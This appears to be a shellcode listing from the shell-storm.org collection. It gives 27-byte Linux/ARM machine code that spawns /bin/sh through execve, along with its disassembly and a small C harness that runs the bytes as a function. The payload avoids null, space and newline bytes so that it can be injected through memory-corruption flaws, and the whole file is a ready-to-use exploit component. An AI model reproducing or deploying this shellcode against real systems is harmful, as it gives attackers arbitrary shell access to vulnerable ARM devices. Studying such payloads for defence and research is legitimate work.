/*
Title:     Linux/ARM - execve("/bin/sh", [0], [0 vars]) - 27 bytes
Date:      2010-08-31
Tested on: ARM926EJ-S rev 5 (v5l)
Author:    Jonathan Salwan - twitter: @jonathansalwan

shell-storm.org

Shellcode ARM with not a 0x20, 0x0a and 0x00


Disassembly of section .text:

00008054 <_start>:
    8054:	e28f3001 	add	r3, pc, #1	; 0x1
    8058:	e12fff13 	bx	r3
    805c:	4678      	mov	r0, pc
    805e:	3008      	adds	r0, #8
    8060:	1a49      	subs	r1, r1, r1
    8062:	1a92      	subs	r2, r2, r2
    8064:	270b      	movs	r7, #11
    8066:	df01      	svc	1
    8068:	622f      	str	r7, [r5, #32]
    806a:	6e69      	ldr	r1, [r5, #100]
    806c:	732f      	strb	r7, [r5, #12]
    806e:	0068      	lsls	r0, r5, #1

*/

#include <stdio.h>



char SC[] = "\x01\x30\x8f\xe2"
            "\x13\xff\x2f\xe1"
            "\x78\x46\x08\x30"
            "\x49\x1a\x92\x1a"
            "\x0b\x27\x01\xdf"
            "\x2f\x62\x69\x6e"
            "\x2f\x73\x68";


int main(void)
{
        fprintf(stdout,"Length: %d\n",strlen(SC));
        (*(void(*)()) SC)();
return 0;
}